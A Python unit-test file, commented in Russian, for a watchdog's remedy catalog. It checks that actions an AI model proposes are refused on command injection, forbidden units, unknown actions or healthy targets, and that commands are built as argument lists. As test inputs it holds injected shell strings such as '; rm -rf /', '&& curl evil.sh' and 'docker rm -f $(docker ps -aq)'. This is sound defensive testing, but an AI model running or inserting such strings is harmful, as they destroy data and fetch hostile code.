#!/usr/bin/env python3
"""Проверка каталога починок.

Ценность каталога не в том, что он умеет запускать, а в том, что он отказывается
запускать. Поэтому тест почти целиком про отказы: инъекция в имя цели, запретный
юнит, цель у действия, которое цели не принимает, действие не из списка.

Запуск: python3 watchdog/test_catalog.py
"""

import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import catalog  # noqa: E402


class CatalogTest(unittest.TestCase):

    # --- Отказы: форма цели -------------------------------------------------

    def test_инъекция_в_имя_юнита_отвергнута(self):
        for target in ("; rm -rf /", "nginx.service && curl evil.sh",
                       "$(whoami).service", "../../etc/passwd", "nginx.service\nrm -rf /"):
            with self.subTest(target=target):
                with self.assertRaises(catalog.RemedyError):
                    catalog.resolve("restart_unit", target)

    def test_инъекция_в_имя_контейнера_отвергнута(self):
        for target in ("../../etc", "a; docker rm -f $(docker ps -aq)", "-v/:/host"):
            with self.subTest(target=target):
                with self.assertRaises(catalog.RemedyError):
                    catalog.resolve("restart_container", target)

    def test_пустая_цель_отвергнута(self):
        with self.assertRaises(catalog.RemedyError):
            catalog.resolve("restart_unit", None)

    # --- Отказы: постоянный запрет ------------------------------------------

    def test_запретные_юниты_не_трогаем_даже_если_они_упали(self):
        """Рестарт ssh при сетевой поломке — это потеря доступа к машине."""
        with mock.patch.object(catalog, "failed_units",
                               return_value={"ssh.service", "xray-bridge.service",
                                             "systemd-networkd.service", "fail2ban.service"}):
            for target in ("ssh.service", "xray-bridge.service",
                           "systemd-networkd.service", "fail2ban.service"):
                with self.subTest(target=target):
                    with self.assertRaises(catalog.RemedyError) as ctx:
                        catalog.resolve("restart_unit", target)
                    self.assertIn("запрет", str(ctx.exception))

    # --- Отказы: несоответствие живому состоянию ----------------------------

    def test_целый_юнит_перезапускать_нечего(self):
        """Между советом модели и нажатием кнопки юнит мог подняться сам."""
        with mock.patch.object(catalog, "failed_units", return_value=set()):
            with self.assertRaises(catalog.RemedyError) as ctx:
                catalog.resolve("restart_unit", "nginx.service")
            self.assertIn("не в состоянии failed", str(ctx.exception))

    def test_целый_контейнер_перезапускать_нечего(self):
        with mock.patch.object(catalog, "broken_containers", return_value=set()):
            with self.assertRaises(catalog.RemedyError):
                catalog.resolve("restart_container", "svod-bot-1")

    # --- Отказы: несуществующее действие ------------------------------------

    def test_действие_вне_каталога_отвергнуто(self):
        for action in ("rm_rf", "exec", "restart_unit; rm -rf /", "", "__import__"):
            with self.subTest(action=action):
                with self.assertRaises(catalog.RemedyError):
                    catalog.resolve(action, "nginx.service")

    def test_лишняя_цель_отвергнута(self):
        with self.assertRaises(catalog.RemedyError):
            catalog.resolve("prune_builder", "что-нибудь")

    # --- Разрешения ---------------------------------------------------------

    def test_упавший_юнит_перезапускается(self):
        with mock.patch.object(catalog, "failed_units", return_value={"report_bot.service"}):
            cmd = catalog.resolve("restart_unit", "report_bot.service")
        self.assertEqual(cmd, ["systemctl", "restart", "--", "report_bot.service"])

    def test_сломанный_контейнер_перезапускается(self):
        with mock.patch.object(catalog, "broken_containers", return_value={"svod-bot-1"}):
            cmd = catalog.resolve("restart_container", "svod-bot-1")
        self.assertEqual(cmd, ["docker", "restart", "--", "svod-bot-1"])

    def test_ничего_не_делать_ничего_не_запускает(self):
        self.assertIsNone(catalog.resolve("nothing"))

    def test_команды_собираются_списком_без_shell(self):
        """Ни один построитель не должен возвращать строку: строка означала бы
        shell, а shell означал бы, что имя цели снова становится кодом."""
        with mock.patch.object(catalog, "failed_units", return_value={"a.service"}), \
             mock.patch.object(catalog, "broken_containers", return_value={"c"}):
            for action_id, target in (("restart_unit", "a.service"),
                                      ("restart_container", "c"),
                                      ("prune_builder", None),
                                      ("vacuum_journal", None)):
                with self.subTest(action_id=action_id):
                    cmd = catalog.resolve(action_id, target)
                    self.assertIsInstance(cmd, list)
                    self.assertTrue(all(isinstance(part, str) for part in cmd))

    def test_каталог_для_модели_не_раскрывает_команд(self):
        """Модель видит смысл действий, но не то, во что они разворачиваются."""
        text = catalog.describe_for_model()
        for leak in ("systemctl", "docker builder", "journalctl", "--vacuum"):
            self.assertNotIn(leak, text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
